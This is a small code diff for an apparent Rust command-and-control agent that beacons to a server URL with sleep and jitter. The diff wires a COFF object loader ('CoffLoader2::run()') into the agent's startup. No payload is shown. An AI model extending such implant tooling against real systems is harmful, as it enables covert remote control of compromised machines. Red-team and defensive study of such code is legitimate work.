@@ -6,7 +6,7 @@ use agent::error::Error;
 use agent::executor::{CommandExecutor, OsCommandExecutor};
 use agent::transport::{HttpTransport, Transport};
 // use coffee_ldr::loader::Coffee;
-
+use CoffLoader2;
 
 use tracing_subscriber::EnvFilter;
 
@@ -14,7 +14,9 @@ const USAGE: &str = "usage: agent <server_url> <sleep_seconds> [jitter]\n\
                      example: agent http://192.168.1.10:8080 5 0.2";
 
 fn main() {
-    init_logging(); 
+    init_logging();
+
+    CoffLoader2::run();
 
     let config = match parse_args() {
         Ok(c) => c,
